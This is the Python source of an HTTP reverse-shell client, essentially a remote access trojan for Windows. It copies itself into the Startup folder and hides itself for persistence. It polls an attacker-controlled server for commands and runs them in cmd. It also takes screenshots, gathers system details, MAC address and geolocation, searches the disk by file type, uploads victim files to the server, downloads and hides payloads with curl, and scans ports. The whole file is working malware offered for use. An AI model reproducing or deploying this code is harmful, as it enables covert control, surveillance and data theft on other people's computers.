# importing required modules
import subprocess
import time
import requests
import random
import os
import pyautogui
import socket
import uuid
import getpass
import platform
import re
from ip2geotools.databases.noncommercial import DbIpCity

# shell info & data
HOST = "127.0.0.1"
PORT = 8080
ADDRESS = f"http://{HOST}:{PORT}"
TIME_TO_RECONNECT = random.randint(0, 3)
EXTERNAL_IP_ADDRESS = requests.get("https://api.ipify.org").text
USER_NAME = getpass.getuser()
DOWNLOAD_PATH = "C:\\Users\\{}\\Desktop\\".format(USER_NAME)  # change it as you want
STARTUP_PATH = r"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(
    USER_NAME
)


def auto_run():
    """[Copy the shell to the startup directory <<Persistence>>]"""

    path = STARTUP_PATH  # the startup directory path
    file_name = __file__.split("\\")[-1]  # the currane file/script name
    file_in_startup = path + "\\" + file_name

    # check if the file_in_startup is true : mean if the script in the startup directory or not
    # if true, we would not need to do the operation of create the script in startup directory.

    if os.path.isfile(file_in_startup):
        # inform the attacker
        requests.post(url=ADDRESS, data=f"[+] HTTP-Reversed-Shell is already @[{path}]")
    else:
        try:
            # read the currant file content
            with open(__file__, "rb") as file:
                content = file.read()
            # write the file in the startup directory
            with open(file_in_startup, "wb") as final:
                final.write(content)
            # check again
            if os.path.isfile(file_in_startup):
                requests.post(
                    url=ADDRESS, data=f"[+] Now, HTTP-Reversed-Shell @[{path}]"
                )
            os.chdir(path)  # change directory to the startup directory
            os.system(f'attrib +h "{file_name}"')  # make the shell hidden
        except Exception as error:
            requests.post(url=ADDRESS, data=f"[-] Error msg: {str(error)}")


def port_scanner(ip, ports):
    """[scan spacific ip address with N number of ports number]

    Command Example:
        >> scan 127.0.0.1:80,50,8080

    Args:
        ip ([string])       : [IP address that you want to scan it]
        ports ([list])      : [ports number to scan each one of them]
    """

    scan_result = f"[+] Scan Result of ({ports}) ports"
    for port in ports.split(","):
        socket_obj = socket.socket()
        result = socket_obj.connect_ex((ip, int(port)))
        if result == 0:
            scan_result += f"\n[+] Port {port} is open"
        else:
            scan_result += f"\n[-] Port {port} is close"
    requests.post(url=ADDRESS, data=scan_result)


def snapshot():
    """[tacking screenshot from victim pc then send it to the attacker machine]"""

    currant_wd = os.getcwd()
    # get screenshot object
    my_screenshot = pyautogui.screenshot()
    screen_name = "client_screen.png"
    # save the screenshot
    my_screenshot.save(screen_name)
    if os.path.exists(currant_wd):
        # redirect to the store address @ serevr side
        url = ADDRESS + "/store"
        files = {"file": open(currant_wd + f"/{screen_name}", "rb")}
        # post screenshot to the server
        requests.post(url, files=files)
    os.remove(screen_name)


def ip_info():
    """[getting ip information then send it to the attacker]

    # here i have used geolocation.py script
    # from: https://github.com/dscciem/Pentesting-and-Hacking-Scripts/blob/master/Geolocation/geolocation.py
    # thanks Amit366 <3"""

    response = response = DbIpCity.get(EXTERNAL_IP_ADDRESS, api_key="free")
    geo_ip_info = f"""
    ========== IP Information ==========
    IP          : {EXTERNAL_IP_ADDRESS}
    Region      : {response.region}
    Country     : {response.country}
    City        : {response.city}
    longitude   : {response.longitude}
    latitude    : {response.latitude}
    =====================================
    """
    requests.post(url=ADDRESS, data=geo_ip_info)


def system_information():
    """[getting basic system information & to get more info user systeminfo]"""

    info = f"""
    ========== Target Information ==========
    [+] System Type         : {platform.uname().system}
    [+] Currant login User  : {platform.uname().node}
    [+] System Release      : {platform.uname().release}
    [+] System Version      : {platform.uname().version}
    [+] Machine Architectur : {platform.uname().machine}
    [+] External IP Address : {EXTERNAL_IP_ADDRESS}
    [+] MAC Address         : {':'.join(re.findall('..', '%012x' % uuid.getnode()))}
    [+] Shell Path          : {__file__}
    ========================================\n"""
    requests.post(url=ADDRESS, data=info)


def find_with(path, extension):
    r"""[find files with x extension like PDFs,PNGs...etc]

    Command Example:
        >> find pdf@c:\

    Args:
        path ([string])         : [the path to search in like C:\  D:\]
        extension ([string])    : [the extension like png,jpg]
    """

    results = ""  # result variable
    requests.post(url=ADDRESS, data="[+] Searching. . .\n")
    # using os.walk
    for directory, _, files in os.walk(path):
        for file in files:
            # check if file ends with our extension
            if file.endswith(f".{extension}"):
                results = results + "\n" + os.path.join(directory, file)
    if results == "":
        requests.post(
            url=ADDRESS, data="[-] No {0}@{1} Directory!".format(extension, path)
        )
    else:
        requests.post(url=ADDRESS, data="[+] Final Results:\n")
        requests.post(url=ADDRESS, data=results)


def cmd(command):
    """[running commands throught the terminal/cmd]

    Args:
        command ([string]): [cmd command like ipconfig]

    Returns:
        command_stdout([bytes])      :[command result if it runned successfully]
        command_stderr([bytes])      :[command result if it runned with error]
    """

    # passing commands to shell
    command_result = subprocess.Popen(
        command,
        shell=True,  # execute throght the shell/cmd/terminal.
        stdin=subprocess.PIPE,  # for getting input.
        stdout=subprocess.PIPE,  # for getting outputs.
        stderr=subprocess.PIPE,
    )  # for getting errors.
    # reading std.out/err
    command_stdout = command_result.stdout.read()
    command_stderr = command_result.stderr.read()
    # return pair of std.out/err
    return (command_stdout, command_stderr)


def download(file_name, url):
    """[downloading files from the attcker server]

    Args:
        file_name ([type])      :[the name of file that will appear at target PC]
        url ([type])            :[the url from the attacker server to download it]
    """

    path = DOWNLOAD_PATH
    try:
        if os.path.isdir(path):
            os.chdir(path)
            # the command to download file from the server
            command = f"curl.exe --output {file_name} --url {url}"
            # cmd returns pair (out, err)
            result = cmd(command)
            check_file = f"{path}\\{file_name}"
            while True:
                if os.path.isfile(check_file):
                    # check if the file downloaded
                    requests.post(url=ADDRESS, data=result[0])
                    requests.post(url=ADDRESS, data=result[1])
                    requests.post(
                        url=ADDRESS, data=f"[+] File was uploaded successfully! @{path}"
                    )
                    # hide the file
                    cmd(f"attrib +h {file_name}")
                    break  # exit the loop
                else:
                    # wait a second
                    time.sleep(1)
                    requests.post(url=ADDRESS, data="[-] Wait Seccond plz!")

    except Exception as error:
        requests.post(url=ADDRESS, data=str(error).encode())


def main():
    # calling Persistence function
    try:
        auto_run()
    except:
        requests.post(
            url=ADDRESS, data="[-] Not able to copy to startup directory".encode()
        )

    while True:
        try:
            # sending a GET request to the server <http_server.py>
            req = requests.get(ADDRESS)
            # store the received txt "command" into command variable
            command = req.text

            print(command)
            # check if the attcker want to terminate the connection
            if "end_session" in command:
                break

            # getting files from the victim PC.
            elif "get" in command:
                # get files from the clint
                _, path = command.split(" ")
                if os.path.exists(path):
                    # redirect to the store file @ serevr side
                    url = ADDRESS + "/store"
                    files = {"file": open(path, "rb")}
                    requests.post(url, files=files)
                else:
                    # file doesn't exist
                    requests.post(
                        url=ADDRESS, data="[-] Not able to find the file!".encode()
                    )

            # file navigation
            elif "cd" in command:
                _, directory = command.split(" ")
                try:
                    os.chdir(directory)
                    cwd = f"[+] CWD : {os.getcwd()}"
                    requests.post(url=ADDRESS, data=cwd)
                except Exception as error:
                    requests.post(url=ADDRESS, data=str(error))

            elif "snapshot" in command:
                # calling snapshot function
                snapshot()

            elif "scan" in command:
                _, com = command.split(" ")
                com = com.split(":")
                ip = com[0]
                ports = com[1]
                # calling scanner function
                port_scanner(ip, ports)

            elif "information" in command:
                # calling system_information function
                system_information()

            elif "find" in command:
                # delete find keyword
                command = command[5:]
                # split the command for extension and path
                extension, path = command.split("@")
                # calling find function
                find_with(path, extension)

            elif "geo_ip" in command:
                # calling ip geolocation function
                ip_info()

            elif "upload" in command:
                file_name, url = command[7:].split("@")
                # download files to this "victim" PC
                download(file_name, url)

            else:
                # pass command to cmd/terminal to be executed
                result_out, result_error = cmd(command)
                # POST the command result to the server
                requests.post(url=ADDRESS, data=result_out)
                requests.post(url=ADDRESS, data=result_error)

        except:
            # try to reconnect
            time.sleep(TIME_TO_RECONNECT)


if __name__ == "__main__":
    # calling main function
    main()
